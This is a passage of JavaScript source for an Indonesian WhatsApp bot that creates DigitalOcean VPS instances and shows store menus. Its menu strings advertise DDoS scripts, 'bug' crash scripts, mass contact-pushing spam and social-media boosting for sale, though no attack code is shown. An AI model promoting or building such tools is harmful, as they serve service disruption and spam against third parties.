        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
minSaldo(sender, 55000, db_saldo)
break
    case "vps1g1c": {
if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
let hostname = args[0];
if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case "vps2g1c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case "vps2g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case "vps4g2c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case "vps8g4c": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return m.reply('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
        case "payment": case "pay": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}dana
⭔ ${prefix}gopay ( Sedang Proses Bep🥰 ) 
⭔ ${prefix}orkut
⭔ ${prefix}qris
⭔ ${prefix}bri

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "vps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST VPS BY DE4YOU OFFCIAL* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ VPS RAM 2GB CORE 1 : 25K
⭔ VPS RAM 2GB CORE 2 : 35K
⭔ VPS RAM 4GB CORE 2 : 45K
⭔ VPS RAM 8GB CORE 4 : 55K
⭔ VPS RAM 16GB CORE 8 : 130k

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
        case "jasa": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *LIST JASA BY Xycan OFFCIAL* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ JASA INSTALL SERVER : 10K
⭔ JASA INSTALL THEMA. : 5K
⭔ JASA FIX SC            : 20K
⭔ JASA EDIT SC           : 15K

*NOTE : Hubungi Owner!!*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case "adminpanel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *ADMIN PANEL* )▭▬▭

⭔${prefix}buyadminpanel
⭔${prefix}panelprem

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "filesc": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FILE SC* )▭▬▭

ReadMe.txt
Sc+v8.zip
all
appearance.js
connect.js
database
freya
node_modules
package-lock.json
package.json
scrape
session
testimoni
thumb.png
v8²

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buyadminpanel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY ADMIN PANEL* )▭▬▭

*NEED ADMIN PANEL KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6288286517973*
*PEMBAYARAN VIA :*
*-QRIS*
*-GOPAY*
*-BRI*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "infosc":
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
owned = `${namaCreator}@s.whatsapp.net`
if (!q) return reply(`*[ SCRIPT BY DE4YOU OFFCIAL ]*\n\n*> MAU BELI SC NYA?*\n*>SC NYA GAK DI JUAL 😁*\n*TAPI KALO DI TAKE GANJA GAS*\n\n*- KEUNTUNGAN :*\n*> BISA PUSH KONTAK*\n*> BISA JPM + GAMBAR*\n*> JPM TANPA CAPE CUMA LEWAT BOT*\n*> BISA SAVE KONTAK LEWAT ID*\n*> BISA CREATE PANEL OTOMATIS*\n*> BISA BUY SC OTOMATIS*\n*> BISA ADDPM2*\n*> BISA DDOS*\n*> BISA SUBDO*\n*> TOPUP GAME*\n*> SERVER ADA 3*\n*> SUNTIK SOSMED*\n*> CREATE NOKOS*\n\n*JOIN GROUP :*\n*https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f_*\n*YOUTUBE :*\n*_https://youtube.com/@Zamzz127*\n*TELEGRAM :*\n*_https://t.me/publichosting_*\n*MINAT? CHAT WA DI BAWAH*\n*_wa.me/6288286517973_*`)
break
case "panelprem": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY PANEL PREMIUM* )▭▬▭

*NEED PANEL PREM KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6288286517973*
*PEMBAYARAN VIA :*
*-QRIS*
*-GOPAY*
*-BRI*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buysc": case "cekharga": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY SCRIPT* )▭▬▭

*Mau Buy Sc? Pilih Sc Dibawah Ini* :

*Sc Bug v1 15k*
*Sc Bug v2 25k*
*Sc Bug v3 35k*
*Sc Hw 19 20k*
*Sc Hw 19 Fitur Jpm 25k*
*Sc Hw 19 Fitur Jpm + Cpanel 30k*
*Sc Campuran v2 15k*
*Sc Campuran v3 25k*
*Sc Campuran v3 + Subdo 30k*
*Sc Campuran v4 35k*
*Sc Campuran v5 50k*
*Sc Campuran v6 60k*
*Sc Campuran v6 + Subdo 70k*
*Sc Campuran v7 + otp 75k*
*Sc Campuran v7 + addpm2 85k*
*Sc Campuran v8 90k* ( Free Panel Unli )
*Sc Cvps v1 50k*
*Sc Cvps v2 80k* ( Free Panel Unli )
*Sc Jaga Grupv1 10k*
*Sc Jaga Grupv2 15k*
*Sc Pushkontak 10k*
*Sc PushAutoSave 15k*
*Sc Jpm X PushKntk v1 15k*
*Sc Jpm X PushKntk v2 20k*
*Sc Jpm X PushKntk v3 25k*
*Sc Themav1 10k*
*Sc Themav2 15k*
*Sc Nowa 20k*
*Sc Webp 10k*
*Sc Tesmoni 15k*
*Sc Ddos 20k*
*Sc Buka Enc 15k*
*Module 15k*
*Admin Panel 15k ( Garansi 7Day )*
*All Vps ( Pm Owner )*

*Usahakan Saldo Mu Mencukupi Ya Kak🙏*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sewa": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SEWA BOT PANEL* )▭▬▭

Sewa Bot ? 
Hubungi *@${owned.split("@")[0]}* 
Untuk Nego Harga😁

▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "speksrv": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SPEK* )▭▬▭

*SERVER 1*
*HARGA ADMIN PANEL : ${harga1}*
*RAM : ${spekvps1}*
*PROVIDER : ${vps1}*
*SERVER 2*
*HARGA ADMIN PANEL : ${harga2}*
*RAM : ${spekvps2}*
*PROVIDER : ${vps2}*
*SERVER 3*
*HARGA ADMIN PANEL : ${harga3}*
*RAM : ${spekvps3}*
*PROVIDER : ${vps3}*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "sc": case "script": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SCRIPT* )▭▬▭

Mau Sc ? Buy Ke Dia *@${owned.split("@")[0]}*

© Cs DE4YOU Offcial
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "storemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}vps
⭔ ${prefix}done
⭔ ${prefix}done?
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}listvps1
⭔ ${prefix}listvps2
⭔ ${prefix}reqpanel

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "linklog1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN 1*
${domain}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "linklog2": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN 2*
${domainn}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "linklog3": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN 3*
${domainnn}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "linkyt": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK YOUTUBE* )▭▬▭

*LINK YOUTUBE*
${youtube}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "linktele": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK TELEGRAM* )▭▬▭

*LINK TELEGRAM*
${telegram}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
